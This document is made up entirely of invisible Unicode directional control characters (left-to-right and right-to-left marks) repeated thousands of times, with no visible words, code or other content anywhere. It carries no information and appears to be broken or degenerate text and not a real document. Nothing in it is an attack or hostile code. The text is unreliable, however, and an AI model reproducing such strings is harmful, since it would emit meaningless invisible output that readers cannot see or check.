‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎